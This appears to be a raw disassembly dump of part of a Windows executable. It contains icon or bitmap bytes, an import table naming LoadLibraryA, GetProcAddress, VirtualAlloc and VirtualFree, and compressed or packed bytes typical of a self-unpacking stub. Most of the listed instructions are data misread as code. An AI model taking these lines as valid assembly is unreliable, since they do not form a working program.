  41db48:	0e                   	push   %cs
  41db49:	0e                   	push   %cs
  41db4a:	0d 0d 0d 91 01       	or     $0x1910d0d,%eax
  41db4f:	01 5f 6c             	add    %ebx,0x6c(%edi)
	...
  41db5e:	5b                   	pop    %ebx
  41db5f:	9a 14 03 03 03 03 03 	lcall  $0x303,$0x3030314
  41db66:	03 03                	add    (%ebx),%eax
  41db68:	03 03                	add    (%ebx),%eax
  41db6a:	03 03                	add    (%ebx),%eax
  41db6c:	04 03                	add    $0x3,%al
  41db6e:	12 21                	adc    (%ecx),%ah
  41db70:	20 36                	and    %dh,(%esi)
  41db72:	4a                   	dec    %edx
  41db73:	5b                   	pop    %ebx
  41db74:	5b                   	pop    %ebx
  41db75:	4c                   	dec    %esp
  41db76:	6a 3d                	push   $0x3d
  41db78:	8d 8e 7f 01 01 90    	lea    -0x6ffefe81(%esi),%ecx
  41db7e:	01 01                	add    %eax,(%ecx)
  41db80:	6a 6c                	push   $0x6c
	...
  41db8e:	5b                   	pop    %ebx
  41db8f:	8d 2d 03 03 03 03    	lea    0x3030303,%ebp
  41db95:	03 03                	add    (%ebx),%eax
  41db97:	03 03                	add    (%ebx),%eax
  41db99:	03 03                	add    (%ebx),%eax
  41db9b:	05 2d 7f 1f 1b       	add    $0x1b1f7f2d,%eax
  41dba0:	08 07                	or     %al,(%edi)
  41dba2:	05 03 0f 1c 21       	add    $0x211c0f03,%eax
  41dba7:	20 36                	and    %dh,(%esi)
  41dba9:	4a                   	dec    %edx
  41dbaa:	5b                   	pop    %ebx
  41dbab:	5b                   	pop    %ebx
  41dbac:	82 44 44 44 44       	addb   $0x44,0x44(%esp,%eax,2)
  41dbb1:	6c                   	insb   (%dx),%es:(%edi)
	...
  41dbbe:	00 5b 9a             	add    %bl,-0x66(%ebx)
  41dbc1:	08 03                	or     %al,(%ebx)
  41dbc3:	03 03                	add    (%ebx),%eax
  41dbc5:	03 03                	add    (%ebx),%eax
  41dbc7:	03 03                	add    (%ebx),%eax
  41dbc9:	03 03                	add    (%ebx),%eax
  41dbcb:	2d 59 6a 6f 7a       	sub    $0x7a6f6a59,%eax
  41dbd0:	7b 94                	jnp    0x41db66
  41dbd2:	9d                   	popf
  41dbd3:	9f                   	lahf
  41dbd4:	9f                   	lahf
  41dbd5:	1f                   	pop    %ds
  41dbd6:	0a 08                	or     (%eax),%cl
  41dbd8:	06                   	push   %es
  41dbd9:	05 03 16 1c 5b       	add    $0x5b1c1603,%eax
	...
  41dbee:	00 5b 7a             	add    %bl,0x7a(%ebx)
  41dbf1:	0d 03 03 03 03       	or     $0x3030303,%eax
  41dbf6:	03 03                	add    (%ebx),%eax
  41dbf8:	03 03                	add    (%ebx),%eax
  41dbfa:	0a 9a 65 5b 00 00    	or     0x5b65(%edx),%bl
  41dc00:	5b                   	pop    %ebx
  41dc01:	5b                   	pop    %ebx
  41dc02:	5b                   	pop    %ebx
  41dc03:	5b                   	pop    %ebx
  41dc04:	5b                   	pop    %ebx
  41dc05:	6a 78                	push   $0x78
  41dc07:	7a 57                	jp     0x41dc60
  41dc09:	9b                   	fwait
  41dc0a:	0e                   	push   %cs
  41dc0b:	0d 0b 44 00 00       	or     $0x440b,%eax
	...
  41dc20:	5f                   	pop    %edi
  41dc21:	9e                   	sahf
  41dc22:	01 01                	add    %eax,(%ecx)
  41dc24:	0c 0c                	or     $0xc,%al
  41dc26:	09 08                	or     %ecx,(%eax)
  41dc28:	06                   	push   %es
  41dc29:	08 01                	or     %al,(%ecx)
  41dc2b:	50                   	push   %eax
  41dc2c:	5b                   	pop    %ebx
	...
  41dc35:	5b                   	pop    %ebx
  41dc36:	5b                   	pop    %ebx
  41dc37:	5b                   	pop    %ebx
  41dc38:	5b                   	pop    %ebx
  41dc39:	5b                   	pop    %ebx
  41dc3a:	5b                   	pop    %ebx
  41dc3b:	5b                   	pop    %ebx
  41dc3c:	5b                   	pop    %ebx
	...
  41dc4d:	00 00                	add    %al,(%eax)
  41dc4f:	00 5b 63             	add    %bl,0x63(%ebx)
  41dc52:	82 76 55 8c          	xorb   $0x8c,0x55(%esi)
  41dc56:	8e 34 01             	mov    (%ecx,%eax,1),%?
  41dc59:	01 8c 5b 00 00 00 00 	add    %ecx,0x0(%ebx,%ebx,2)
	...
  41dc80:	00 00                	add    %al,(%eax)
  41dc82:	5b                   	pop    %ebx
  41dc83:	5b                   	pop    %ebx
  41dc84:	5b                   	pop    %ebx
  41dc85:	5b                   	pop    %ebx
  41dc86:	5b                   	pop    %ebx
  41dc87:	5b                   	pop    %ebx
  41dc88:	5b                   	pop    %ebx
  41dc89:	5b                   	pop    %ebx
  41dc8a:	37                   	aaa
	...
  41ddc7:	00 ff                	add    %bh,%bh
  41ddc9:	ff                   	(bad)
  41ddca:	ff                   	(bad)
  41ddcb:	ff                   	(bad)
  41ddcc:	ff                   	(bad)
  41ddcd:	ff 00                	incl   (%eax)
  41ddcf:	00 ff                	add    %bh,%bh
  41ddd1:	ff                   	(bad)
  41ddd2:	ff                   	(bad)
  41ddd3:	ff                   	(bad)
  41ddd4:	ff                   	(bad)
  41ddd5:	ff 00                	incl   (%eax)
  41ddd7:	00 ff                	add    %bh,%bh
  41ddd9:	ff                   	(bad)
  41ddda:	ff                   	(bad)
  41dddb:	ff                   	(bad)
  41dddc:	ff                   	(bad)
  41dddd:	ff 00                	incl   (%eax)
  41dddf:	00 ff                	add    %bh,%bh
  41dde1:	ff                   	(bad)
  41dde2:	ff                   	(bad)
  41dde3:	ff                   	(bad)
  41dde4:	ff                   	(bad)
  41dde5:	ff 00                	incl   (%eax)
  41dde7:	00 ff                	add    %bh,%bh
  41dde9:	ff                   	(bad)
  41ddea:	ff                   	(bad)
  41ddeb:	ff                   	(bad)
  41ddec:	ff                   	(bad)
  41dded:	ff 00                	incl   (%eax)
  41ddef:	00 ff                	add    %bh,%bh
  41ddf1:	ff                   	(bad)
  41ddf2:	ff                   	(bad)
  41ddf3:	ff                   	(bad)
  41ddf4:	ff                   	(bad)
  41ddf5:	ff 00                	incl   (%eax)
  41ddf7:	00 ff                	add    %bh,%bh
  41ddf9:	07                   	pop    %es
  41ddfa:	ff                   	(bad)
  41ddfb:	ff                   	(bad)
  41ddfc:	ff                   	(bad)
  41ddfd:	ff 00                	incl   (%eax)
  41ddff:	00 fe                	add    %bh,%dh
  41de01:	00 7f ff             	add    %bh,-0x1(%edi)
  41de04:	ff                   	(bad)
  41de05:	ff 00                	incl   (%eax)
  41de07:	00 fe                	add    %bh,%dh
  41de09:	00 07                	add    %al,(%edi)
  41de0b:	ff                   	(bad)
  41de0c:	ff                   	(bad)
  41de0d:	ff 00                	incl   (%eax)
  41de0f:	00 fe                	add    %bh,%dh
  41de11:	00 00                	add    %al,(%eax)
  41de13:	7f ff                	jg     0x41de14
  41de15:	ff 00                	incl   (%eax)
  41de17:	00 fe                	add    %bh,%dh
  41de19:	00 00                	add    %al,(%eax)
  41de1b:	07                   	pop    %es
  41de1c:	ff                   	(bad)
  41de1d:	ff 00                	incl   (%eax)
  41de1f:	00 fe                	add    %bh,%dh
  41de21:	00 00                	add    %al,(%eax)
  41de23:	00 7f ff             	add    %bh,-0x1(%edi)
  41de26:	00 00                	add    %al,(%eax)
  41de28:	fe 00                	incb   (%eax)
  41de2a:	00 00                	add    %al,(%eax)
  41de2c:	07                   	pop    %es
  41de2d:	ff 00                	incl   (%eax)
  41de2f:	00 fe                	add    %bh,%dh
  41de31:	00 00                	add    %al,(%eax)
  41de33:	00 03                	add    %al,(%ebx)
  41de35:	ff 00                	incl   (%eax)
  41de37:	00 fe                	add    %bh,%dh
  41de39:	00 00                	add    %al,(%eax)
  41de3b:	00 01                	add    %al,(%ecx)
  41de3d:	ff 00                	incl   (%eax)
  41de3f:	00 fe                	add    %bh,%dh
  41de41:	00 00                	add    %al,(%eax)
  41de43:	00 01                	add    %al,(%ecx)
  41de45:	ff 00                	incl   (%eax)
  41de47:	00 fe                	add    %bh,%dh
  41de49:	00 00                	add    %al,(%eax)
  41de4b:	00 01                	add    %al,(%ecx)
  41de4d:	ff 00                	incl   (%eax)
  41de4f:	00 fc                	add    %bh,%ah
  41de51:	00 00                	add    %al,(%eax)
  41de53:	00 00                	add    %al,(%eax)
  41de55:	ff 00                	incl   (%eax)
  41de57:	00 fc                	add    %bh,%ah
  41de59:	00 00                	add    %al,(%eax)
  41de5b:	00 00                	add    %al,(%eax)
  41de5d:	ff 00                	incl   (%eax)
  41de5f:	00 fc                	add    %bh,%ah
  41de61:	00 00                	add    %al,(%eax)
  41de63:	00 00                	add    %al,(%eax)
  41de65:	ff 00                	incl   (%eax)
  41de67:	00 fc                	add    %bh,%ah
  41de69:	00 00                	add    %al,(%eax)
  41de6b:	00 00                	add    %al,(%eax)
  41de6d:	ff 00                	incl   (%eax)
  41de6f:	00 fc                	add    %bh,%ah
  41de71:	00 00                	add    %al,(%eax)
  41de73:	00 00                	add    %al,(%eax)
  41de75:	ff 00                	incl   (%eax)
  41de77:	00 fc                	add    %bh,%ah
  41de79:	00 00                	add    %al,(%eax)
  41de7b:	00 00                	add    %al,(%eax)
  41de7d:	7f 00                	jg     0x41de7f
  41de7f:	00 fc                	add    %bh,%ah
  41de81:	00 00                	add    %al,(%eax)
  41de83:	00 00                	add    %al,(%eax)
  41de85:	7f 00                	jg     0x41de87
  41de87:	00 fc                	add    %bh,%ah
  41de89:	00 00                	add    %al,(%eax)
  41de8b:	00 00                	add    %al,(%eax)
  41de8d:	7f 00                	jg     0x41de8f
  41de8f:	00 fc                	add    %bh,%ah
  41de91:	00 00                	add    %al,(%eax)
  41de93:	00 00                	add    %al,(%eax)
  41de95:	7f 00                	jg     0x41de97
  41de97:	00 fc                	add    %bh,%ah
  41de99:	00 00                	add    %al,(%eax)
  41de9b:	00 00                	add    %al,(%eax)
  41de9d:	7f 00                	jg     0x41de9f
  41de9f:	00 fc                	add    %bh,%ah
  41dea1:	00 00                	add    %al,(%eax)
  41dea3:	00 00                	add    %al,(%eax)
  41dea5:	7f 00                	jg     0x41dea7
  41dea7:	00 fc                	add    %bh,%ah
  41dea9:	00 00                	add    %al,(%eax)
  41deab:	00 00                	add    %al,(%eax)
  41dead:	7f 00                	jg     0x41deaf
  41deaf:	00 fc                	add    %bh,%ah
  41deb1:	00 00                	add    %al,(%eax)
  41deb3:	00 00                	add    %al,(%eax)
  41deb5:	3f                   	aas
  41deb6:	00 00                	add    %al,(%eax)
  41deb8:	fc                   	cld
  41deb9:	00 00                	add    %al,(%eax)
  41debb:	00 00                	add    %al,(%eax)
  41debd:	3f                   	aas
  41debe:	00 00                	add    %al,(%eax)
  41dec0:	fc                   	cld
  41dec1:	00 00                	add    %al,(%eax)
  41dec3:	00 00                	add    %al,(%eax)
  41dec5:	3f                   	aas
  41dec6:	00 00                	add    %al,(%eax)
  41dec8:	fc                   	cld
  41dec9:	00 00                	add    %al,(%eax)
  41decb:	00 00                	add    %al,(%eax)
  41decd:	3f                   	aas
  41dece:	00 00                	add    %al,(%eax)
  41ded0:	fc                   	cld
  41ded1:	00 00                	add    %al,(%eax)
  41ded3:	00 00                	add    %al,(%eax)
  41ded5:	3f                   	aas
  41ded6:	00 00                	add    %al,(%eax)
  41ded8:	fc                   	cld
  41ded9:	00 00                	add    %al,(%eax)
  41dedb:	00 00                	add    %al,(%eax)
  41dedd:	3f                   	aas
  41dede:	00 00                	add    %al,(%eax)
  41dee0:	fc                   	cld
  41dee1:	00 00                	add    %al,(%eax)
  41dee3:	00 00                	add    %al,(%eax)
  41dee5:	3f                   	aas
  41dee6:	00 00                	add    %al,(%eax)
  41dee8:	fc                   	cld
  41dee9:	00 00                	add    %al,(%eax)
  41deeb:	00 00                	add    %al,(%eax)
  41deed:	3f                   	aas
  41deee:	00 00                	add    %al,(%eax)
  41def0:	fe 00                	incb   (%eax)
  41def2:	00 00                	add    %al,(%eax)
  41def4:	03 ff                	add    %edi,%edi
  41def6:	00 00                	add    %al,(%eax)
  41def8:	fe 00                	incb   (%eax)
  41defa:	03 00                	add    (%eax),%eax
  41defc:	03 ff                	add    %edi,%edi
  41defe:	00 00                	add    %al,(%eax)
  41df00:	ff 00                	incl   (%eax)
  41df02:	07                   	pop    %es
  41df03:	f8                   	clc
  41df04:	07                   	pop    %es
  41df05:	ff 00                	incl   (%eax)
  41df07:	00 ff                	add    %bh,%bh
  41df09:	00 0f                	add    %cl,(%edi)
  41df0b:	ff                   	(bad)
  41df0c:	ff                   	(bad)
  41df0d:	ff 00                	incl   (%eax)
  41df0f:	00 ff                	add    %bh,%bh
  41df11:	c0 1f ff             	rcrb   $0xff,(%edi)
  41df14:	ff                   	(bad)
  41df15:	ff 00                	incl   (%eax)
  41df17:	00 ff                	add    %bh,%bh
  41df19:	ff                   	(bad)
  41df1a:	ff                   	(bad)
  41df1b:	ff                   	(bad)
  41df1c:	ff                   	(bad)
  41df1d:	ff 00                	incl   (%eax)
  41df1f:	00 ff                	add    %bh,%bh
  41df21:	ff                   	(bad)
  41df22:	ff                   	(bad)
  41df23:	ff                   	(bad)
  41df24:	ff                   	(bad)
  41df25:	ff 00                	incl   (%eax)
  41df27:	00 ff                	add    %bh,%bh
  41df29:	ff                   	(bad)
  41df2a:	ff                   	(bad)
  41df2b:	ff                   	(bad)
  41df2c:	ff                   	(bad)
  41df2d:	ff 00                	incl   (%eax)
  41df2f:	00 ff                	add    %bh,%bh
  41df31:	ff                   	(bad)
  41df32:	ff                   	(bad)
  41df33:	ff                   	(bad)
  41df34:	ff                   	(bad)
  41df35:	ff 00                	incl   (%eax)
  41df37:	00 ff                	add    %bh,%bh
  41df39:	ff                   	(bad)
  41df3a:	ff                   	(bad)
  41df3b:	ff                   	(bad)
  41df3c:	ff                   	(bad)
  41df3d:	ff 00                	incl   (%eax)
  41df3f:	00 ff                	add    %bh,%bh
  41df41:	ff                   	(bad)
  41df42:	ff                   	(bad)
  41df43:	ff                   	(bad)
  41df44:	ff                   	(bad)
  41df45:	ff 00                	incl   (%eax)
  41df47:	00 00                	add    %al,(%eax)
  41df49:	00 01                	add    %al,(%ecx)
  41df4b:	00 01                	add    %al,(%ecx)
  41df4d:	00 30                	add    %dh,(%eax)
  41df4f:	60                   	pusha
  41df50:	00 00                	add    %al,(%eax)
  41df52:	01 00                	add    %eax,(%eax)
  41df54:	08 00                	or     %al,(%eax)
  41df56:	a8 0e                	test   $0xe,%al
  41df58:	00 00                	add    %al,(%eax)
  41df5a:	31 75 00             	xor    %esi,0x0(%ebp)
  41df5d:	00 00                	add    %al,(%eax)
  41df5f:	00 ac df 01 00 bc df 	add    %ch,-0x2043ffff(%edi,%ebx,8)
  41df66:	01 00                	add    %eax,(%eax)
  41df68:	d0 df                	rcr    $1,%bh
  41df6a:	01 00                	add    %eax,(%eax)
  41df6c:	e0 df                	loopne 0x41df4d
  41df6e:	01 00                	add    %eax,(%eax)
  41df70:	00 00                	add    %al,(%eax)
  41df72:	00 00                	add    %al,(%eax)
  41df74:	60                   	pusha
  41df75:	df 01                	filds  (%ecx)
  41df77:	00 00                	add    %al,(%eax)
  41df79:	00 00                	add    %al,(%eax)
  41df7b:	00 ff                	add    %bh,%bh
  41df7d:	ff                   	(bad)
  41df7e:	ff                   	(bad)
  41df7f:	ff 9c df 01 00 60 df 	lcall  *-0x209fffff(%edi,%ebx,8)
  41df86:	01 00                	add    %eax,(%eax)
	...
  41df9c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  41dfa0:	65 6c                	gs insb (%dx),%es:(%edi)
  41dfa2:	33 32                	xor    (%edx),%esi
  41dfa4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  41dfa7:	6c                   	insb   (%dx),%es:(%edi)
  41dfa8:	00 00                	add    %al,(%eax)
  41dfaa:	00 00                	add    %al,(%eax)
  41dfac:	00 00                	add    %al,(%eax)
  41dfae:	4c                   	dec    %esp
  41dfaf:	6f                   	outsl  %ds:(%esi),(%dx)
  41dfb0:	61                   	popa
  41dfb1:	64 4c                	fs dec %esp
  41dfb3:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
  41dfba:	00 00                	add    %al,(%eax)
  41dfbc:	00 00                	add    %al,(%eax)
  41dfbe:	47                   	inc    %edi
  41dfbf:	65 74 50             	gs je  0x41e012
  41dfc2:	72 6f                	jb     0x41e033
  41dfc4:	63 41 64             	arpl   %eax,0x64(%ecx)
  41dfc7:	64 72 65             	fs jb  0x41e02f
  41dfca:	73 73                	jae    0x41e03f
  41dfcc:	00 00                	add    %al,(%eax)
  41dfce:	00 00                	add    %al,(%eax)
  41dfd0:	00 00                	add    %al,(%eax)
  41dfd2:	56                   	push   %esi
  41dfd3:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
  41dfda:	6c                   	insb   (%dx),%es:(%edi)
  41dfdb:	6c                   	insb   (%dx),%es:(%edi)
  41dfdc:	6f                   	outsl  %ds:(%esi),(%dx)
  41dfdd:	63 00                	arpl   %eax,(%eax)
  41dfdf:	00 00                	add    %al,(%eax)
  41dfe1:	00 56 69             	add    %dl,0x69(%esi)
  41dfe4:	72 74                	jb     0x41e05a
  41dfe6:	75 61                	jne    0x41e049
  41dfe8:	6c                   	insb   (%dx),%es:(%edi)
  41dfe9:	46                   	inc    %esi
  41dfea:	72 65                	jb     0x41e051
  41dfec:	65 00 00             	add    %al,%gs:(%eax)
  41dfef:	96                   	xchg   %eax,%esi
  41dff0:	e5 b0                	in     $0xb0,%eax
  41dff2:	8e 21                	mov    (%ecx),%fs
  41dff4:	b2 b3                	mov    $0xb3,%dl
  41dff6:	68 58 3c 29 ae       	push   $0xae293c58
  41dffb:	0c eb                	or     $0xeb,%al
  41dffd:	3f                   	aas
  41dffe:	c1 21 86             	shll   $0x86,(%ecx)
  41e001:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41e002:	e6 b9                	out    %al,$0xb9
  41e004:	fc                   	cld
  41e005:	1b 31                	sbb    (%ecx),%esi
  41e007:	82 9c 52 4d 1c 96 cb 	sbbb   $0x5a,-0x3469e3b3(%edx,%edx,2)
  41e00e:	5a 
  41e00f:	73 df                	jae    0x41dff0
  41e011:	fc                   	cld
  41e012:	00 00                	add    %al,(%eax)
  41e014:	08 d1                	or     %dl,%cl
  41e016:	01 48 e1             	add    %ecx,-0x1f(%eax)
  41e019:	01 56 57             	add    %edx,0x57(%esi)
  41e01c:	53                   	push   %ebx
  41e01d:	55                   	push   %ebp
  41e01e:	8b 74 24 14          	mov    0x14(%esp),%esi
  41e022:	7c 66                	jl     0x41e08a
  41e024:	00 f2                	add    %dh,%dl
  41e026:	d0 18                	rcrb   $1,(%eax)
  41e028:	fc                   	cld
  41e029:	1e                   	push   %ds
  41e02a:	83 c6 04             	add    $0x4,%esi
  41e02d:	85 db                	test   %ebx,%ebx
  41e02f:	0f 84 2a 01 34 ba    	je     0xba75e15f
  41e035:	3d 75 75 fc 06       	cmp    $0x6fc7575,%eax
  41e03a:	80 03 df             	addb   $0xdf,(%ebx)
  41e03d:	8a 06                	mov    (%esi),%al
  41e03f:	28 88 07 c7 80 0f    	sub    %cl,0xf80c707(%eax)
  41e045:	dd 7d b9             	fnstsw -0x47(%ebp)
  41e048:	25 d2 75 8b 16       	and    $0x168b75d2,%eax
  41e04d:	8d 76 04             	lea    0x4(%esi),%esi
  41e050:	b8 b1 01 79 13       	mov    $0x137901b1,%eax
  41e055:	73 e4                	jae    0x41e03b
  41e057:	3b fb                	cmp    %ebx,%edi
  41e059:	0f 83 ff 2b 86 57    	jae    0x57c80c5e
  41e05f:	bb 65 e1 d9 e1       	mov    $0xe1d9e165,%ebx
  41e064:	00 33                	add    %dh,(%ebx)
  41e066:	ed                   	in     (%dx),%eax
  41e067:	8b c3                	mov    %ebx,%eax
  41e069:	8d 7c 1d eb          	lea    -0x15(%ebp,%ebx,1),%edi
  41e06d:	df 67 ee             	fbld   -0x12(%edi)
  41e070:	7f 4e                	jg     0x41e0c0
  41e072:	29 5c 3d 74          	sub    %ebx,0x74(%ebp,%edi,1)
  41e076:	c7                   	(bad)
  41e077:	71 07                	jno    0x41e080
  41e079:	38 f5                	cmp    %dh,%ch
  41e07b:	ef                   	out    %eax,(%dx)
  41e07c:	15 d6 5f 5d 5b       	adc    $0x5b5d5fd6,%eax
  41e081:	2b c1                	sub    %ecx,%eax
  41e083:	2e b9 01 c3 52 72    	cs mov $0x7252c301,%ecx
  41e089:	5a                   	pop    %edx
  41e08a:	57                   	push   %edi
  41e08b:	c9                   	leave
  41e08c:	0d 72 e6 56 c5       	or     $0xc556e672,%eax
  41e091:	29 06                	sub    %eax,(%esi)
  41e093:	d0 f7                	shl    $1,%bh
  41e095:	2b f5                	sub    %ebp,%esi
  41e097:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  41e099:	5e                   	pop    %esi
  41e09a:	b9 02 4f eb 80       	mov    $0x80eb4f02,%ecx
  41e09f:	29 c0                	sub    %eax,%eax
  41e0a1:	3e ec                	ds in  (%dx),%al
  41e0a3:	d1 7f 0d             	sarl   $1,0xd(%edi)
  41e0a6:	7c 83                	jl     0x41e02b
  41e0a8:	c0 01 e0             	rolb   $0xe0,(%ecx)
  41e0ab:	d1 1b                	rcrl   $1,(%ebx)
  41e0ad:	1d e8 3d 80 48       	sbb    $0x48803de8,%eax
  41e0b2:	d9 ff                	fcos
  41e0b4:	81 07 07 0a 11 aa    	addl   $0xaa110a07,(%edi)
  41e0ba:	08 91 f0 e9 ec fe    	or     %dl,-0x1131610(%ecx)
  41e0c0:	ff 37                	push   (%edi)
  41e0c2:	80 90 10 8b c7 2b 44 	adcb   $0x44,0x2bc78b10(%eax)
  41e0c9:	3e ce                	ds into
  41e0cb:	5f                   	pop    %edi
  41e0cc:	5e                   	pop    %esi
  41e0cd:	c2 0c 29             	ret    $0x290c
  41e0d0:	1c 15                	sbb    $0x15,%al
  41e0d2:	0a 07                	or     (%edi),%al
  41e0d4:	50                   	push   %eax
  41e0d5:	57                   	push   %edi
  41e0d6:	40                   	inc    %eax
  41e0d7:	04 f8                	add    $0xf8,%al
  41e0d9:	11 71 34             	adc    %esi,0x34(%ecx)
  41e0dc:	e3 29                	jecxz  0x41e107
  41e0de:	01 60 df             	add    %esp,-0x21(%eax)
  41e0e1:	38 64 08 10          	cmp    %ah,0x10(%eax,%ecx,1)
  41e0e5:	32 86 a0 88 14 03    	xor    0x31488a0(%esi),%al
  41e0eb:	5c                   	pop    %esp
  41e0ec:	1f                   	pop    %ds
  41e0ed:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41e0ee:	84 14 02             	test   %dl,(%edx,%eax,1)
  41e0f1:	34 86                	xor    $0x86,%al
  41e0f3:	14 dc                	adc    $0xdc,%al
  41e0f5:	52                   	push   %edx
  41e0f6:	ef                   	out    %eax,(%dx)
  41e0f7:	24 10                	and    $0x10,%al
  41e0f9:	04 62                	add    $0x62,%al
  41e0fb:	79 61                	jns    0x41e15e
  41e0fd:	91                   	xchg   %eax,%ecx
  41e0fe:	e2 a3                	loop   0x41e0a3
  41e100:	41                   	inc    %ecx
  41e101:	76 1f                	jbe    0x41e122
  41e103:	1c 2c                	sbb    $0x2c,%al
  41e105:	76 30                	jbe    0x41e137
  41e107:	08 30                	or     %dh,(%eax)
  41e109:	10 84 bc 84 42 1e 73 	adc    %al,0x731e4284(%esp,%edi,4)
  41e110:	9f                   	lahf
  41e111:	98                   	cwtl
  41e112:	88 21                	mov    %ah,(%ecx)
  41e114:	53                   	push   %ebx
  41e115:	57                   	push   %edi
  41e116:	56                   	push   %esi
  41e117:	50                   	push   %eax
  41e118:	18 06                	sbb    %al,(%esi)
  41e11a:	28 55 e8             	sub    %dl,-0x18(%ebp)
  41e11d:	19 5d 81             	sbb    %ebx,-0x7f(%ebp)
  41e120:	ed                   	in     (%dx),%eax
  41e121:	d5 12                	aad    $0x12
  41e123:	54                   	push   %esp
  41e124:	8d b5 cc 0d 8b 46    	lea    0x468b0dcc(%ebp),%esi
  41e12a:	fc                   	cld
  41e12b:	dc 04 f4             	faddl  (%esp,%esi,8)
  41e12e:	d1 c3                	rol    $1,%ebx
  41e130:	a3 c7 de 56 08       	mov    %eax,0x856dec7
  41e135:	76 1c                	jbe    0x41e153
  41e137:	00 6c 6c 07          	add    %ch,0x7(%esp,%ebp,2)
  41e13b:	03 f2                	add    %edx,%esi
  41e13d:	8d bd 96 30 ad ab    	lea    -0x5452cf6a(%ebp),%edi
  41e143:	04 34                	add    $0x34,%al
  41e145:	7b 48                	jnp    0x41e18f
  41e147:	01 74 15 8b          	add    %esi,-0x75(%ebp,%edx,1)
  41e14b:	73 44                	jae    0x41e191
  41e14d:	85 3a                	test   %edi,(%edx)
  41e14f:	7e 1b                	jle    0x41e16c
  41e151:	77 f6                	ja     0x41e149
  41e153:	0e                   	push   %cs
  41e154:	b9 23 79 3e 7b       	mov    $0x7b3e7923,%ecx
  41e159:	40                   	inc    %eax
  41e15a:	22 cf                	and    %bh,%cl
  41e15c:	ef                   	out    %eax,(%dx)
  41e15d:	a8 fa                	test   $0xfa,%al
  41e15f:	f5                   	cmc
  41e160:	50                   	push   %eax
  41e161:	86 18                	xchg   %bl,(%eax)
  41e163:	fe                   	(bad)
  41e164:	1e                   	push   %ds
  41e165:	39 01                	cmp    %eax,(%ecx)
  41e167:	2f                   	das
  41e168:	6f                   	outsl  %ds:(%esi),(%dx)
  41e169:	04 f1                	add    $0xf1,%al
  41e16b:	1b 16                	sbb    (%esi),%edx
  41e16d:	51                   	push   %ecx
  41e16e:	e8 18 c6 30 65       	call   0x6572a78b
  41e173:	3a f5                	cmp    %ch,%dh
  41e175:	90                   	nop
  41e176:	01 8b 4e 2c a4 24    	add    %ecx,0x24a42c4e(%ebx)
  41e17c:	03 aa 89 8d 92 51    	add    0x51928d89(%edx),%ebp
  41e182:	6a 40                	push   $0x40
  41e184:	18 50 3c             	sbb    %dl,0x3c(%eax)
  41e187:	52                   	push   %edx
  41e188:	68 9d 51 8e 12       	push   $0x128e519d
  41e18d:	89 85 8e 25 56 e8    	mov    %eax,-0x17a9da72(%ebp)
  41e193:	9b                   	fwait
  41e194:	43                   	inc    %ebx
  41e195:	64 4d                	fs dec %ebp
  41e197:	e6 47                	out    %al,$0x47
  41e199:	76 b0                	jbe    0x41e14b
  41e19b:	85 c0                	test   %eax,%eax
  41e19d:	0f 94 9e 52 59 64 bf 	sete   -0x409ba6ae(%esi)
  41e1a4:	28 30                	sub    %dh,(%eax)
  41e1a6:	0c 45                	or     $0x45,%al
  41e1a8:	fd                   	std
  41e1a9:	90                   	nop
  41e1aa:	01 ec                	add    %ebp,%esp
  41e1ac:	49                   	dec    %ecx
  41e1ad:	61                   	popa
  41e1ae:	c2 9e 34             	ret    $0x349e
  41e1b1:	85 c9                	test   %ecx,%ecx
  41e1b3:	8f 89 84 08          	(bad)
  41e1b7:	51                   	push   %ecx
  41e1b8:	8d 0a                	lea    (%edx),%ecx
  41e1ba:	18 c4                	sbb    %al,%ah
  41e1bc:	46                   	inc    %esi
  41e1bd:	75 05                	jne    0x41e1c4
  41e1bf:	6e                   	outsb  %ds:(%esi),(%dx)
  41e1c0:	74 7b                	je     0x41e23d
  41e1c2:	8b 95 5b 19 c7 8d    	mov    -0x7238e6a5(%ebp),%edx
  41e1c8:	5f                   	pop    %edi
  41e1c9:	0d 0c 30 88 8c       	or     $0x8c88300c,%eax
  41e1ce:	44                   	inc    %esp
  41e1cf:	75 08                	jne    0x41e1d9
  41e1d1:	a2 be eb 2d f7       	mov    %al,0xf72debbe
  41e1d6:	c1 57 80 74          	rcll   $0x74,-0x80(%edi)
  41e1da:	1e                   	push   %ds
  41e1db:	52                   	push   %edx
  41e1dc:	81 e1 ff 02 7f 85    	and    $0x857f02ff,%ecx
  41e1e2:	42                   	inc    %edx
  41e1e3:	c4 0c 51             	les    (%ecx,%edx,2),%ecx
  41e1e6:	8d 85 7d 31 50 0e    	lea    0xe50317d(%ebp),%eax
  41e1ec:	9e                   	sahf
  41e1ed:	1c ff                	sbb    $0xff,%al
  41e1ef:	95                   	xchg   %eax,%ebp
  41e1f0:	d0 26                	shlb   $1,(%esi)
  41e1f2:	1d ad 90 c5 01       	sbb    $0x1c590ad,%eax
  41e1f7:	ff 08                	decl   (%eax)
  41e1f9:	03 c8                	add    %eax,%ecx
  41e1fb:	41                   	inc    %ecx
  41e1fc:	52                   	push   %edx
  41e1fd:	3f                   	aas
  41e1fe:	48                   	dec    %eax
  41e1ff:	43                   	inc    %ebx
  41e200:	88 62 a0             	mov    %ah,-0x60(%edx)
  41e203:	96                   	xchg   %eax,%esi
  41e204:	0d 6a 10 85 36       	or     $0x3685106a,%eax
  41e209:	1c bc                	sbb    $0xbc,%al
  41e20b:	95                   	xchg   %eax,%ebp
  41e20c:	cc                   	int3
  41e20d:	91                   	xchg   %eax,%ecx
  41e20e:	50                   	push   %eax
  41e20f:	d4 40                	aam    $0x40
  41e211:	15 08 72 35 0b       	adc    $0xb357208,%eax
  41e216:	32 de                	xor    %dh,%bl
  41e218:	24 c0                	and    $0xc0,%al
  41e21a:	8f                   	(bad)
  41e21b:	1f                   	pop    %ds
  41e21c:	10 75 43             	adc    %dh,0x43(%ebp)
  41e21f:	0c 4b                	or     $0x4b,%al
  41e221:	40                   	inc    %eax
  41e222:	f1                   	int1
  41e223:	03 f7                	add    %edi,%esi
  41e225:	c6 06 58             	movb   $0x58,(%esi)
  41e228:	61                   	popa
  41e229:	82 09 e9             	orb    $0xe9,(%ecx)
  41e22c:	83 c1 05             	add    $0x5,%ecx
  41e22f:	cf                   	iret
  41e230:	89 46 32             	mov    %eax,0x32(%esi)
